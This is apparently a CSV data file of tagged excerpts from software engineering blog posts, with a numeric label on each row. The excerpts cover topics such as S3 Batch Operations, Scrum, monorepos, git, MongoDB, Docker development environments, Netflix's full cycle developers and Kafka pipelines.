724,"Search for Android on __url__ and youll notice that 51 of the 147 books listed are published not by OReilly but instead by a British company named Packt (one of the many publishers that OReilly distributes). Packt has probably perfected the machine gun approach to technical publishing. When a new open-source library or framework arrives, Packt quickly recruits an author to write a short hands-on introduction. The example code sometimes includes bugs. The explanations arent always clear or well crafted. And yet there they are, on shelves in Frys Electronics and available online as e-books, right when Im most curious to learn about a new technical topic.","['Programming', 'Books', 'Publishing', 'Software Development', 'Libraries']",16
725,"I recently* served as a technical reviewer of a Packt title, and the experience confirmed many of my impressions. While their authors and editors care about quality and accuracy, its speed that matters most. These are not ___: The Definitive Guide, or even Learning ____ titles. These are throw-away books (which I do not mean in a derogatory way). Theyre more like magazines than books: accessible, timely, and worth a single read. I question their pedagogical value (just as I questioned the first-to-market junk from New Riders, an earlier machine-gun technical publisher), and yet its hard to argue with a book when its the only one in the store or on the website about a new topic. The only way to argue with it is to give up on technical books entirely.","['Programming', 'Books', 'Publishing', 'Software Development', 'Libraries']",12
726,"Yes, Im belaboring this dry topic of technical books and documentation. But its relevant to practical questions Ive been wondering about recently: When new, junior software developers arrive in my office, what advice should I give them? What resources should I point them toward? Are there books, classes, or conferences that are worth paying for? Or do software development and system administration skills come only from hands-on experimentation (a Montessori school, where one is only allowed a command line and Stack Overflow access)? Here are my tentative recommendations: It rarely hurts to read a (quality) technical book or browse (well-maintained) docs. In fact, ranging across a few books or docs can help you zoom back from a line of code and more fully understand the context of different libraries, languages, and components. That said, not all technical books are high-quality, not all docs are well-maintained, and one resource in isolation may be of limited use outside of the context of a bookshelf (physical or electronic). The technical publishers sausage factories have produced mixed offerings over the past 15 years. And while I still regularly purchase books from OReilly and other traditional technical publishers (especially Pragmatic Programmers for Ruby and Apress for i OS), my center of focused has moved to Dash and its list of docsets. If youre a developer, junior or senior, I recommend giving Dash or one of its equivalents a try. See how much you can accomplish with those on-screen docs, along with a handful of dependable computer science and software engineering books in paper or on a tablet.","['Programming', 'Books', 'Publishing', 'Software Development', 'Libraries']",2
727,"If youve ever tried to run operations on a large number of objects in S3, you might have encountered a few hurdles. Listing all files and running the operation on each object can get complicated and time consuming as the number of objects scales up. Many decisions have to be made: is running the operations from my personal computer fast enough? Or should I run it from a server thats closer to the AWS resources, benefiting from AWSs fast internal network? If so, Ill have to provision resources (e.g. ec2 instance, lambda functions, containers, etc) to run the job.","['AWS', 'S3', 'Cloud Computing', 'Amazon', 'DevOps']",10
728,"From the Batch Operations console, click the Create Job button: In the first step, choose CSV (1) as the Manifest format. Also, enter the path to your manifest file (2) (mine is s3://spgingras-batch-test/manifest.csv): Then, click Next. On the second screen you will decide what operation to run on the S3 objects. Choose the Replace all tags (1), and add new tags to the list (2). I chose to add the type and environment tags, but you can choose anything you want: Note that this will replace all tags on all objects in the manifest. Also, its pretty cool that at some point in the future, youll be able to invoke Lambda functions on your S3 objects!","['AWS', 'S3', 'Cloud Computing', 'Amazon', 'DevOps']",7
729,"On the following screen, you will have to choose the IAM role you have created previously. Remember, this role will be used by Batch Operations to play with your bucket. For this example, I have named the IAM role simply batch-role. Uncheck the Generate completion report (1) (you dont need that for the demo) and pick the IAM role from the dropdown (2): Now, click Next. On the following screen, review the details to make sure everything is OK, and click Create job. The job is now created, and we can run it.","['AWS', 'S3', 'Cloud Computing', 'Amazon', 'DevOps']",7
730,"Now that the job is created, its time to run it. From the Batch Operations console, click on the Jobs ID: In the jobs description screen, click on the Confirm and run button: And in the next screen, confirm the details and click Run job. Now, go back to the Batch Operations console. Wait until your jobs status (1) is Complete. Spam that refresh button (2) if needed: Now that the job is completed, go back to your bucket. Open one of the objects Properties pane: Youll notice that all tags of the object have been updated. The same will be true for every other object you included in the manifest file Using S3 Batch Operations, its now pretty easy to modify S3 objects at scale. Simply select files you want to act on in a manifest, create a job and run it. No servers to create, no scaling to manage. With this new feature of S3, here are some ideas of tasks you could run:copy S3 objects in bulk from one bucket to anothersend media files to Elastic Transcoderretroactively update tags on old S3 objects.","['AWS', 'S3', 'Cloud Computing', 'Amazon', 'DevOps']",7
731,"In fact, your team will work at the highest of its velocity to deliver product increments with high business value. It would not really make sense to commit to less than that. But, is it not at the detriment of innovation and creativity? Do you get any time in your sprint to let developers try out new things? Well, you might not have realized it yet, but Scrum is a great framework for innovation. There is a trick that will: motivate your development team to adopt forward thinking in daily work; drive technical innovation across the company; and improve the general quality of products.","['Agile', 'Product Owner', 'Innovation', 'Scrum', 'Sprint']",1
732,"There, I was between a rock and a hard chair. On one hand, I did not see how I could add the implementation of Hystrix in a sprint. We had so many high value business features waiting in the product backlog. How would I justify the cost of implementing Hystrix to our business sponsor? How would I prioritize it over business features? On the other hand, I really wanted to encourage developers to think forward and take initiatives to drive technical innovation and improve our products. Do you get any free time during your sprints that you could use to introduce innovation? When one sprint ends, the next one starts right away, right? But, does it mean that you have no free time in your sprints?","['Agile', 'Product Owner', 'Innovation', 'Scrum', 'Sprint']",1
733,"It is so difficult to plan a Scrum sprint in a way that the developers work at full capacity throughout the entire sprint. It might happen that a Scrum team over estimates the work and effort necessary to reach the sprint goals. I mean, who would know, in advance, what it takes to achieve a task or even reach a sprint goal? Hence, it may happen that your team finishes the sprint early, or that a developer finishes off all of his tasks before the end of the sprint. In fact, people naturally tend to be careful. So, how would you manage this unexpected and unplanned available capacity you have until the end of the sprint? I guess that most of the time, product owners will use the product backlog to assign new tasks to the developers. This practice raises many questions that I will not talk about in this article. I am sure there are many other practices that product owners use to manage a sprint finishing earlier the planned. Here is my favorite practice: How about giving your team this free time to create, innovate, and improving your products? Wait, giving developers free time to innovate does ring a bell, does it not? This idea, or inspiration, originally came from Googles legendary 20% policy for side projects. I am not quite sure how it works there, or even if it is still in place, but I truly believe it is a great idea for multiple reasons. In brief, you encourage forward thinking and give your employees a real opportunity to personally take initiatives, defend their ideas, and implement solutions.","['Agile', 'Product Owner', 'Innovation', 'Scrum', 'Sprint']",1
734,"I asked Gab to take some time to analyze Hystrix and plan a short presentation for our Scrum team. At the end of this meeting, we added the following Epic to the product backlog: Hystrix implementation in the Delivery component. Under this Epic, we had a 3 user stories. All together, we estimated the implementation of Hystrix to approximately 5 man/days. (Arf, I dont like to talk estimates in man/days. The real estimates for these stories were 2 hamsters and 1 dog, but this is another story).","['Agile', 'Product Owner', 'Innovation', 'Scrum', 'Sprint']",6
735,"A few weeks later, Gab finished his tasks early in a sprint (on a Wednesday). The other developers were on track with their tasks. So, this was a great opportunity for Gab to start working on the implementation of Hystrix. By the end of the sprint, he had only one task left. We planned it as a priority for the next sprint. There, in two sprints, we added this new technology to our component. Today, Hystrix is implemented in multiple components in our company.","['Agile', 'Product Owner', 'Innovation', 'Scrum', 'Sprint']",1
736,"Why does this work great with Scrum? I truly believe that you cannot cheat with Scrum. As a Scrum team, you know your velocity. The product owner will challenge the team to achieve as much work as possible during the sprint. The team will most probably commit to quite aggressive sprint goals. At some point, all stakeholders (business sponsors and customers) get the idea of what the Scrum team can deliver in a sprint.","['Agile', 'Product Owner', 'Innovation', 'Scrum', 'Sprint']",1
737,"As long as you maintain a high level of velocity (or improve it), and as long as your business sponsors and customers are happy, you should believe that you are doing right. For all these reasons, finishing a sprint early should not be a problem. It should not be considered as bad estimates. So, why not giving this time to developers so that they can innovate? Any initiative must intend to improve a product. This is not a proper google-style side project.","['Agile', 'Product Owner', 'Innovation', 'Scrum', 'Sprint']",1
738,"On the downside, this is quite complicated to manage due to its unpredictable nature. In fact, getting free time at the end of sprint will not happen on every sprint. It is more about being ready to seize an opportunity to innovate when it comes. Also, I want to raise two risks here. You have no control on who finishes a sprint early. What if it is always the same developer? And again, if you start something, you must finish it. Otherwise, you have the risk to have eternal proof-of-concepts (Po C).","['Agile', 'Product Owner', 'Innovation', 'Scrum', 'Sprint']",1
739,"Matt Klein wrote Monorepos: Please dont! I like Matt, I think hes very smart, and you should go read his point of view. He originally posted a poll on twitter: My response was Im literally both of those people. Rather than talk about how dope Rust is, lets dig in to why I think hes wrong about Monorepos. For context, Im the CTO at Chef Software. We have ~100 engineers, a code base that goes back about 1112 years, and 4 major product segments. Some of that code lives in Polyrepos (my starting position), some of it in Monorepos (my current position. )Before I start: every single argument I make here an be applied to any repository layout of any kind. There is no technical reason you must choose one or the other, in my opinion. You can, and will, make either layout work. Im stoked to talk with others about this, but Im not interested in faux-technical reasons one is superior to the other. From a technical perspective, I think its a wash.",['Software Development'],12
740,"Matt and I agree on the first part of this point: You are going to solve the same problems if you choose a monorepo or a polyrepo. How do you manage your build and test infrastructure? The list is endless, and you will solve for them all as you grow.",['Software Development'],13
741,"Its harder to work with outside dependencies I need custom virtual source control systems Certainly, all these points are valid points. They happen in both casesin a polyrepo, I have my junk, except in order to build I might need all the other junk. So I just build tooling, which checks out the whole project. Or I build a fake monorepo with submodules. We could go around all day. But I think Matts argument misses the #1 reason Ive flipped quite hard to a monorepo perspective as my own level in the organization has gotten higher: When we split the repositories up, we are de-facto creating a coordination and visibility problem. It tends to map cleanly to the way we think of teams (especially the way individual contributors think of them): we have responsibility over this component. The boundaries are fixed on my team and the component(s) we work on.",['Software Development'],10
742,"As the architecture gets bigger, no single team can manage it anymore. Very few engineers hold the whole system in their head. Lets say you manage a shared component, A, which is used by teams B, C, and D. Team A is refactoring, adding a better API, and also changing the way the internals work. The result is the change is not backwards compatible. Find all the places where the old API is being used.",['Software Development'],12
743,"In reality, nobody wants to do any of that shit. Its way less fun than just fixing the damn API. In a polyrepo, you can just make your change, get it reviewed by others who are focused on that component (likely not B, C, or D), and move on. Team B, C, and D can all just safely stay on their current version for now. Theyll move when they realize your brilliance! In a monorepo, the onus shifts by default. Team A changes their component, and immediately breaks B, C, and D if they arent careful. This causes B, C, and D to show up at As door, wondering why team A broke the build. This teaches A that they cannot skip my list above. They have to talk about what theyre going to do. Can B, C, and D move? What if B and C can, but D was tightly coupled to a side effect of the behavior of the old algorithm? We then have to talk about how we get out: Support multiple internal APIs, with the old algorithm deprecated, until D can get off it.",['Software Development'],13
744,"Lets say we choose 1, multiple APIs. In this case, we have two live code paths. The old path and the new one. We put the old behavior back in, deprecate it, and agree on a schedule for its removal with team D. Essentially identical in a poly or mono repo.",['Software Development'],18
745,"For multiple released versions, we need to have a fork. We now have two components A1 and A2. Team B and C are on A2, and D is on A1. We need to have each component be a releasable headbecause security updates and other bug fixes may be required before D can move. In a polyrepo, we can hide this away in a long lived branch, which feels good. In a monorepo, we force the code into a new module altogether. Team D has to still take a changeto the old component. Everyone can see the cost we pay herewe have twice as much code now, and any bug fixes that apply to A1 and A2 must be applied in both cases. With the branch approach in a polyrepo, this is hidden away behind cherry picking. We intellectualize the cost as being lower, because its not literally duplicated. In practical terms, the cost is the same: you will build, release, and maintain two mostly identical code bases until such time as you can retire one. The difference is, with a monorepo, this pain is direct and up front. It sucks more, and thats a good thing.",['Software Development'],18
746,"It may be that the changes A made are quality of life for team A. In a polyrepo, we push this to artifact pinning. Just stay on the old version until you catch up! This sets up a game of chicken. Team A continues to work on their component, ignoring that team D is getting ever more stale (thats team Ds problem, those stupid heads.) Meanwhile, team D just talks shit about team As cavalier attitude to code stability, if they talk about it at all. Finally team D decides to take a look at moving, but the changes to A have only gotten bigger. Team A barely remembers when or how they broke D. The upgrade is more painful, and will take longer. Which pushes it further down the priority stack. Until the day we have a security issue in A, when we are forced to fork. Team A has to go backward in time, find the moment where D was stable, fix the issue there, and make it releasable forward in time. This is the de-facto choice people make, and it is by far the worst one. It feels good at the time, both for team A and Dbecause we get to ignore each other.",['Software Development'],1
747,"Yes, you can make tooling that tries to force the issue in polyrepos. But my experience with teaching continuous delivery and automation to huge enterprises tells me this: you want the default behavior, without tooling, to be the behaviors you want to see in the world. The default behavior of a polyrepo is isolationthats the whole point. The default behavior of a monorepo is shared responsibility and visibilitythats the whole point. In both cases, Im going to build tooling to sand off the rough edges. As a leader, Ill pick the monorepo every time: because tools must reinforce the culture I want, and culture comes from the tiny decisions and behaviors of a team every day.",['Software Development'],12
748,"Merge conflicts can also happen while making a pull or push. It is very much possible that two people may have committed simultaneously onto the same parent commit, while working in their respective working directory. Both of them have a different snapshot of the same branch, which requires a merge. The person updating his local repository with a pull or updating the remote repository with a push, after other one has pushed his commit will experience merge, which may or may not lead to a merge conflict. One can wonder why merging is required while making a push or a pull. This happens because the local reference of a branch and the remote reference origin/branch are considered as separate branches. While pulling or pushing, git merges these two references by fast-forward method.","['Git', 'Merge', 'Branch', 'Rebase', 'Version Control']",18
749,"Suppose you are working on a feature branch and somebody just committed something to the parent branch. If this commit is important to your feature and you wish that your branch forked out from the parent after this particular commit, you can try rebasing your branch. When you rebase your branch, the base of the branch changes from old parent commit to the latest commit of the branch onto which you are rebasing. The important thing to note is that, all the existing commits of your branch are created again while rebasing. As the commits are created again, rebasing the branch rewrites the history of that branch. New commits are created with new timestamps.","['Git', 'Merge', 'Branch', 'Rebase', 'Version Control']",18
750,"AWS invests a lot in their training videos. You can enjoy it as well, the registration is free. If youre not the type that reads whitepapers, I strongly recommend to watch the training videos since they summarize the whitepapers' content very clearly. In my view, reading the recommended whitepapers is still beneficial, although it may be tedious. I viewed the videos as supplementary information. They assisted to digest the content of the whitepapers. After watching them some topics became clearer. Although it is repeating the same topics, it can give you subtle insights about things you might have missed. That can be the X factor.","['AWS', 'Certification', 'Solutionsarchitect']",6
751,"However, in my opinion, two caveats are worth mentioning. Therefore, the information might be outdated. For example, if you read that multi-region VPC Peering is not supported, but that is not true anymore. Secondly, you need to remember that the content was prepared by someone that might not be an AWS expert. Therefore, my recommendation is to use these websites wisely and not take them as an ultimate source of truth.","['AWS', 'Certification', 'Solutionsarchitect']",11
752,"In order to bypass these caveats, I have decided to prepare my own cheat sheet. I knew it will be a time consuming task, but on the other hand I knew that the content is reliable . I summarized all the content I read, viewed and listened. It was enriched with my insights and new facts.","['AWS', 'Certification', 'Solutionsarchitect']",4
753,"I managed my cheat sheet in Google Docs. It started from zero pages and it swelled to a 200 pages document. Although Im very proud of it and really tempted to share it online, I avoid doing that, see the caveats above . Appreciate your understanding:)I saved the best for last. I have experience in AWS, but for achieving a certification that was not enough. You need to expand your existing knowledge. AWS is composed of many services, so most likely working with this platform on a daily basis leads you to focus on some specific services rather than experience others. You become an expert in your domain, but you may lack the vast features beyond. Understanding this nature is important for keeping the focus on where to invest your efforts.","['AWS', 'Certification', 'Solutionsarchitect']",6
754,"This second level adds feature branches to the simple workflow. These branches are used to develop new functionalities separately from the rest of the project. After a feature is completed, the branch is merged. Unlike the master branch, the feature branches are therefore short-lived and only exist until their merge. Depending on their complexity, feature branches can often be further subdivided. Just make sure you dont exaggerate, which could again affect the overall structure.","['Git', 'Workflow', 'Version Control', 'Github', 'Development']",18
755,"Find method is used to read documents from a collection. Command to read data is as follows:db.collect Name.find(query, projection)Lets take a look at how we can fetch documents using find method: If we want to fetch all the documents from a collection than we dont pass the query argument and also we want to fetch complete schema along with values for each document than we will not be passing projection argument. Lets look at it in action: As you can see that it retrieved us all the documents, but it is not readable. You can use the find method to fetch all the documents out of the two approaches shown above. So to fetch the documents in a readable format we use pretty method on top of find method to show user friendly result. Lets take a look: Here you can see that the documents are more readable.","['Mongodb', 'JavaScript', 'NoSQL', 'Mean Stack', 'Database']",8
756,Here it returned the document which has technologies property and value as angular which can exist in an array or a key value pair. But if you want that only those documents should be fetched where an array is assigned to technologies property than you can modify your query like this: There can be a scenario where you want to fetch the documents which has a value greater than some property value. You can make use of it like this: It works on strings as well: There can be a scenario where you want to fetch the documents which has a less than some property value. You can make use of it like this: There can be a scenario where you want to fetch the documents which has a value greater than or equal to some property value. You can make use of it like this: There can be a scenario where you want to fetch the documents which has a value less than or equal to some property value. You can make use of it like this: There are scenarios where we want to fetch documents which contains a property and the value of that property is one of the values specified: We have fetched all the documents which have _id property and the value for that is either 6 or 7 or 10.,"['Mongodb', 'JavaScript', 'NoSQL', 'Mean Stack', 'Database']",15
757,"APIs make it easier to connect applications, saving time and money (developer costs). If we have to integrate software (like, for example, payroll, HR and procurement software), we want to make sure the developers planned on their software being easy to connect with other peoples software. This includes them thinking about security standards. Theres LOTS of ways of providing a secure API and authenticating, and this is super critical to a huge company. (If a company that holds your SSN has an API, you want to be really sure theyre not going to get hacked. )Having a good API implies that the company is really structured and organized. A good API with good documentation is like meeting someone with really good filing and organization. It makes them seem trustworthy and un-chaotic. (Note to self: tidy desk before posting this. Modern software tries to use fairly human language, just with more structure around it.","['API', 'Software', 'Startup', 'Business']",10
758,"Youll notice I didnt even explain what it stands for. It almost doesnt matter, because it doesnt help explain it.","['API', 'Software', 'Startup', 'Business']",5
759,"The git remote add command takes two arguments: A remote name, for example, origin A remote URL, for example, __url__ merge.","['Git', 'Github', 'Git Basics', 'Git Commands', 'Git Workflow']",18
760,"Its inevitable, Ill get a new machine that Ill need to setup and configure to make it just the way Im used to. When setting up a new machine Ive got to remember what I need, go download all those things, install them, configure them and make sure they work. Undoubtedly, Ill forget a setting or a package and itll come back to bite me in the behind. A lot of people automate this by using things like Ansible, however. Even through automation this can take time. One benefit of using Docker for this is that automation comes as part of the process.","['Docker', 'Software Engineering', 'Developer Experience']",18
761,"Choosing a base image can be quite daunting. Im always a fan of Alpine Linux for my application containers, so thats what I chose. Alpine also has the benefit of being tiny in size, making the IDE even more portable. In total, once everything is installed and configured, the image is <400mb and Im sure there are some improvements I could make. In a new Dockerfile, start with the below: The core of my environment is built to support my workflow. Im an avid fan of (Neo)Vim and use that as my editor and git (& git-perl) for source code management. I use tmux for splitting my terminal window into many panes and for tabs and ZSH is a nice configurable shell. I also need to install bash and ncurses for tmux plugin manager to work. Open SSh Client for SSHing to things. c URL, less and man are other useful utilities.","['Docker', 'Software Engineering', 'Developer Experience']",7
762,"I like to use Oh My ZSH! with zsh, so I need to install that too: And I cant forget to copy my zshrc, vimrc and __url__ into my environment: Now that my tmux and vim configs exist, I can install all my plugins: You might be thinking but if I want to run Docker commands then I need a terminal on the host. Docker is pretty neat, as the client uses a unix socket to communicate with the daemon. When I launch into the container, I can mount that socket into the container so I can issue commands to the socket, as long as Ive got the client installed. Add docker to the apk install command and when running the image, simply pass -v /var/run/docker.sock:/var/run/docker.sock. Then in the container, any docker command should work as expected.","['Docker', 'Software Engineering', 'Developer Experience']",7
763,"What Ive done is create a new user called me and installed everything within the container in that users home directory, setting $home to the same directory too: This is all well and good, but I need to actually map the new user & group IDs to my local user. Ive created a script that Ill use as the entry point (entrypoint.sh) into the container when it runs. With it, Ill create a group with the same ID as my local group and then modifying the created user me to have the same ID of my local user (passing the local IDs to the container on start by adding some environment variables to my docker run command): When I installed and copied everything over in the Dockerfile, I was actually doing at as the root user. So everything I put in /home/me is owned by root. If Im going to run as me in the container then the.zshrc,.vimrc &.gitconfig wont be picked up when using their counterpart programs due to permissions issues. So in my entrypoint.sh, I run a chown on everything in that directory to set the permissions correctly (I also needed to run chown on /var/run/ __url__ to be able to use docker):su-exec (switch user & execute) is a program that I use as the last thing in the __url__ to launch me into a tmux shell as the me user.","['Docker', 'Software Engineering', 'Developer Experience']",7
764,"I could have just baked my name and email address into the.gitconfig copied into the container, but that would be bad. Not only would my email address and name be exposed in my source code, its also less portable (not that you wouldnt be able to change these details later on). In the __url__ script, at the top, I can use git to set its own config: And when running the container I can pass a couple more environment variables to setup my git user information when it runs: Secrets management is an important part of building any software. One thing Id like to do to further improve the portability of my IDE, is fetch my SSH keys and other security related things from something like Haishi Corp Vault. Id probably have to run such a service myself, so in lieu of having this, I currently distribute my secrets on to the host and then bind mount my SSH keys into the container: Youll note that in the IDE, I dont install any of the compile/runtime dependencies such as Node Js or Scala themselves. The trick here is separate these such environments into their own self-contained image.","['Docker', 'Software Engineering', 'Developer Experience']",7
765,"When Im working on a Scala app, I run one terminal window, split into two. One split that runs the Scala/SBT container and one that runs Vim. To run the Scala container I can run: And I end up with this: As with anything, theres probably room for improvement. Things like Linux Namespaces would help solve the user permissions issues, which would mean I probably wouldnt need to create a user & group and not have to set file permissions on startup. Docker Volumes could help assist with this too. Volumes could also help make the container more isolated from the host machine, removing the need for host bound volumes.","['Docker', 'Software Engineering', 'Developer Experience']",7
766,"Autonomous agents that navigate the real world in real-time such as robots should have the capacity to decide whats the best course of action to take. There are many factors to consider and many possible combinations of actions; which is the best one? For example, suppose you have a robot and you want it to put items in a box. However, there are a lot of items and it is impossible to fit them all in that box which has dimension constraints and a weight limit. How does the robot choose which items to put in that box? Each item can be assigned a value and the robot should maximize the total value of chosen items given the constraints. This is a combinatorial optimization problema packing problem. Given the many variables involved, testing all possible solutions is inefficient, time-consuming, and impractical.","['Self Driving Cars', 'Robotics', 'Artificial Intelligence', 'Rust', 'Programming']",5
767,"For each iteration, we should generate a new population from the previous one. Each population has its own fittest individual, a challenger which could replace the champion. Essentially, each iteration we find the champion which is the best solution weve seen so far. After the series of iterations, the final champions DNA is the best solution weve seen. We can call this a run. We might have to run a simulation several times to get the best solution, if at all, because the algorithm is probabilistic in nature. Repeat this until youre happy with the results! The population size of each and number of iterations per run is something that we can tune.","['Self Driving Cars', 'Robotics', 'Artificial Intelligence', 'Rust', 'Programming']",14
768,"Also mentioned earlier, the childrens DNA are produced using operations inspired by how actual DNAs are altered based on the parents DNA. There are many ways to do this, for simplicity, lets probabilistically alter using types of crossover and mutate operations. Well discuss these two in the next section. Lets define two more parameters to tune which is the probability of crossover and probability of mutation. The crossover probability is the probability that we will perform the crossover operation. We dont need to perform the crossover all the time, we can directly clone the parents sometimes. There is a probability that the parents are already a good candidate solution and that the crossover is an unnecessary expensive operation that might make the solution set worse. Similarly, mutation probability is the probability that a mutation is performed.","['Self Driving Cars', 'Robotics', 'Artificial Intelligence', 'Rust', 'Programming']",5
769,"Netflix has grown to 125M global members enjoying 140M+ hours of viewing per day. Weve invested significantly in improving the development and operations story for our engineering teams. Along the way weve experimented with many approaches to building and operating our services. Wed like to share one approach, including its pros and cons, that is relatively common within Netflix. We hope that sharing our experiences inspires others to debate the alternatives and learn from our journey.","['DevOps', 'Edge Engineering', 'API', 'Sdlc', 'Cloud Services']",6
770,"In search of a better way, we took a step back and decided to start from first principles. What were we trying to accomplish and why werent we being successful? The purpose of the software life cycle is to optimize time to value; to effectively convert ideas into working products and services for customers. Developing and running a software service involves a full set of responsibilities: We had been segmenting these responsibilities. At an extreme, this means each functional area is owned by a different person/role: These specialized roles create efficiencies within each segment while potentially creating inefficiencies across the entire life cycle. Specialists develop expertise in a focused area and optimize whats needed for that area. They get more effective at solving their piece of the puzzle. But software requires the entire life cycle to deliver value to customers. Having teams of specialists who each own a slice of the life cycle can create silos that slow down end-to-end progress. Grouping differing specialists together into one team can reduce silos, but having different people do each role adds communication overhead, introduces bottlenecks, and inhibits the effectiveness of feedback loops.","['DevOps', 'Edge Engineering', 'API', 'Sdlc', 'Cloud Services']",12
771,"Netflix created centralized teams (e.g., Cloud Platform, Performance & Reliability Engineering, Engineering Tools) with the mission of developing common tooling and infrastructure to solve problems that every development team has. Those centralized teams act as force multipliers by turning their specialized knowledge into reusable building blocks. For example: Empowered with these tools in hand, development teams can focus on solving problems within their specific product domain. As additional tooling needs arise, centralized teams assess whether the needs are common across multiple dev teams. Sometimes these local needs are too specific to warrant centralized investment. In that case the development team decides if their need is important enough for them to solve on their own.","['DevOps', 'Edge Engineering', 'API', 'Sdlc', 'Cloud Services']",10
772,"Moving to a full cycle developer model requires a mindset shift. Some developers view design+development, and sometimes testing, as the primary way that they create value. This leads to the anti-pattern of viewing operations as a distraction, favoring short term fixes to operational and support issues so that they can get back to their real job. But the real job of full cycle developers is to use their software development expertise to solve problems across the full life cycle. A full cycle developer thinks and acts like an SWE, SDET, and SRE. At times they create software that solves business problems, at other times they write test cases for that, and still other times they automate operational aspects of that system.","['DevOps', 'Edge Engineering', 'API', 'Sdlc', 'Cloud Services']",12
773,"For this model to succeed, teams must be committed to the value it brings and be cognizant of the costs. Teams need to be staffed appropriately with enough headroom to manage builds and deployments, handle production issues, and respond to partner support requests. Time needs to be devoted to training. Tools need to be leveraged and invested in. Partnerships need to be fostered with centralized teams to create reusable components and solutions. All areas of the life cycle need to be considered during planning and retrospectives. Investments like automating alert responses and building self-service partner support tools need to be prioritized alongside business projects. With appropriate staffing, prioritization, and partnerships, teams can be successful at operating what they build. Without these, teams risk overload and burnout.","['DevOps', 'Edge Engineering', 'API', 'Sdlc', 'Cloud Services']",1
774,"To apply this model outside of Netflix, adaptations are necessary. The common problems across your dev teams are likely similarfrom the need for continuous delivery pipelines, monitoring/observability, and so on. But many companies wont have the staffing to invest in centralized teams like at Netflix, nor will they need the complexity that Netflixs scale requires. Netflixs tools are often open source, and it may be compelling to try them as a first pass. However, other open source and Saa S solutions to these problems can meet most companies needs. Start with analysis of the potential value and count the costs, followed by the mindset-shift. Evaluate what you need and be mindful of bringing in the least complexity necessary.","['DevOps', 'Edge Engineering', 'API', 'Sdlc', 'Cloud Services']",10
775,"The path from 2012 to today has been full of experiments, learning, and adaptations. Edge Engineering, whose earlier experiences motivated finding a better model, is actively applying the full cycle developer model today. Deployments are routine and frequent, canaries take hours instead of days, and developers can quickly research issues and make changes rather than bouncing the responsibilities across teams. Other groups are seeing similar benefits. However, were cognizant that we got here by applying and learning from alternate approaches. We expect tomorrows needs to motivate further evolution.","['DevOps', 'Edge Engineering', 'API', 'Sdlc', 'Cloud Services']",12
776,"At the end of the day, it is maintenance that creates the worst bugs. Like Bob Martin says you should write code, clean code such that any idiot can change and maintain it, and the you of a month from now is the worst idiot of all. As creators of complex software systems we build complex mental models in the process of creating systems but it is impossible to maintain them once we move to the next project. I refer to it as flushing the cache, that part of the short term memory that engineers have repurposed to build complex mental models of our work. Once a month has gone by, even a week in a fast paced environment it becomes impossible to maintain these systems in our brains. All that we are left with is the code itself and the most valuable part of that code should be the tests.","['Software Development', 'Test Driven Development', 'Software Engineering', 'Software Testing']",13
777,"Non-Functional requirements: Assignments are tracked in an ACID compliant database Many different teachers can exist on the same system and share students (think multi-tenancy)Students and teachers only need to exist once in the system but can log in multiple ways (federated identity)The system is built on serverless technology (eg no runtime state)UI is built as a static site accessing a back end APISo those are the current specifications of this proposed system. For the sake of focus lets pretend that product and engineering have already discussed these requirements, a cost estimate was made and a timetable was set for the project. What is the next step then? Now there are probably a factorial complexity tests to write for a project this big so lets focus on one of the functional requirements and how it relates to the rest. Ill use gherkin style for brevity: Given pristine system when a teacher is created then they exist in the system Given a system with a teacher when a teacher is deleted they no longer exist in the system Easy enough, right? That should be everything to create a teacher? In the world of code coverage this API could be written, the code would be reviewed and the team will move on to the next task. If this is the procedure, though, we risk creating something that will not work. The reason is that the tests may cover the use cases but they ignore the other requirements. The tests are essentially wrong before a single line of code is written. Dont take my word for it? What about this test Given a pristine system when a the same teacher is created from two neigh simultaneous requests they exist *only once* in the system.","['Software Development', 'Test Driven Development', 'Software Engineering', 'Software Testing']",9
778,"Note: The interesting topics we want to find are different from Kafka topics. More on Kafka topics in below sections.1. Voice conversations should be converted to text. Techniques like speech to text are at our rescue. We could either build our own model or buy third party service. For this post, this module is out of scope.2. Converted text should be sent back to backend systems in realtime. Data should be held in a way that processes(other than producers) can either ask for future data or wait for future data to get generated. We call this kind of system as a Queue which follows First In, First Out semantics.4. Processes called as consumers should be deployed to read the data from queues, hold the data in memory for certain amount of time usually in the order of minutes and perform business logic computations needed.5. Aggregated data which is the outcome of the above computations could either be sent to another Queue or can be persisted to a database, depending on the need.","['Big Data', 'Kafka', 'Data Pipeline']",6
779,"of partitions and partition key within a topic following should be given importance: Ordering Guaranteeall the events generated should be read in chronological order. Lets say, the consumption pattern is to read all events in sequence of a home(from our example), then partition key could be unique identifier for home. This would ensure all events of the same home would go to same partition. This does not mean we need to create a partition for each home, which could be in millions. A partition will contain conversations from multiple homes. But no conversation of a home will present in 2 partitions.","['Big Data', 'Kafka', 'Data Pipeline']",8
780,"Consumer Groups: A set of consumers[possibly running on same machine or on different machines] can have a unique consumer group id[a string or integer]. While spinning up a new consumer using Consumers API, this consumer group id can be used. Consumers of a consumer group subscribe to a topic(or multiple topics). Kafka takes up the responsibility of delivering the next message to the consumers set subscribed to a topic. Zookeeper is used to make a note of offset read by each consumer group. Once the server gets the ack that a consumer had read the message, next message is delivered.","['Big Data', 'Kafka', 'Data Pipeline']",6
781,"As the consumer job forking the threads does not have any control on the no. of threads, the count could either overwhelm the machine or the no. of threads created could be too less to use all the cores of the machine.2. Using Subscribe Method: Using this method, consumer is in control of determining the threads. of cores in the machine, consumer threads are determined and the partitions are shared among the consumer threads. Care should be taken that the no. of threads are no more than no.","['Big Data', 'Kafka', 'Data Pipeline']",3
782,"The pipeline that we have built now is cumbersome to scale for the following reasons:1. Glue code to spin up multiple consumers to scale them according to load should be written and maintained by the data pipeline developers. This would be additional burden along with the processing logic code that should be written.2. There are two kinds in realtime data pipelines. One kind reads the data at an offset applies the required business logic, writes to the destination. The second kind will accumulate related data from a stream or different streams for a certain time in the order of minutes to perform business logic. The business logic could include transformations and aggregations similar to our example. Distributed frameworks [like Spark] has the capability to handle these multiple microbatches. For the first kind too, to make the pipeline scalable, fault tolerant and resilient, using distributed processing framework is better.","['Big Data', 'Kafka', 'Data Pipeline']",10
783,"Again, you want to explore whether or not this tool could be used as a solution. You are not trying to convince anyone to adopt it yet. They will respond better if you are requesting assistance versus arguing a position. Show that you value their opinion and that their input will be utilized. Circumventing potential detractors is no way to introduce a new tool to your team nor is it a good practice to have with your teammates. To get buy-in from your most cynical teammate, show them that you appreciate their experience and knowledge.","['Software Development', 'DevOps', 'Software Engineering', 'Tools', 'Product Management']",0
